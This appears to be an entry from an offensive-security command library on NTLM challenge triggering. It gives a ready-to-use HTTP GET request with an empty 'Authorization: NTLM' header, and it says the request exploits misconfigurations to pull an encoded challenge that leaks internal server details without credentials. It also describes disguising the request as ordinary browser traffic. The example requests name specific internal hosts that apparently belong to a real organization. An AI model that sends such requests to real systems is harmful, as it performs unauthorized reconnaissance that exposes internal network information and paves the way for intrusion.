---
data: >-
  GET /fr/Pages/ HTTP/1.1

  Host: target-internal-server

  User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101
  Firefox/68.0

  Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8

  Accept-Language: en-US,en;q=0.5

  Accept-Encoding: gzip, deflate

  Connection: close

  Authorization: NTLM
tags:
  - ntlm
  - http-trigger
type: command
executor: http
platforms:
  - Web
id: 9d8b0007-6eee-41a1-b752-e84649a221c0
created_at: '2025-12-14T17:31:19.104Z'
updated_at: '2025-12-14T17:31:19.104Z'
verified: false
validated: true
submitted: true
---
# ntlm-trigger-get-request

## Command

```http
GET /fr/Pages/ HTTP/1.1
Host: target-internal-server
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Authorization: NTLM
```

## Description

This HTTP GET request triggers an NTLM authentication challenge on a protected web endpoint by including an initial 'Authorization: NTLM' header, exploiting misconfigurations to obtain an encoded response without credentials.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| Host | Target internal server hostname or IP | Yes |
| Path (e.g., /fr/Pages/) | Protected endpoint path | Yes |
| Authorization | Set to 'NTLM' (empty value starts handshake) | Yes |
| User-Agent | Standard browser string to mimic legitimate traffic | No |

## Examples

### Basic Usage

```http
GET /fr/Pages/ HTTP/1.1
Host: internal.mtn.local
Authorization: NTLM
```

### Advanced Usage

```http
GET /blog/protected HTTP/1.1
Host: another-server.mtn.co.za
Authorization: NTLM
Accept-Encoding: gzip, deflate
```

## Expected Output

HTTP/1.1 401 Unauthorized response with header: WWW-Authenticate: NTLM <base64-encoded challenge blob containing internal details>.

## Related

- [[Related Procedure: Trigger-NTLM-Challenge-via-HTTP-Request]]
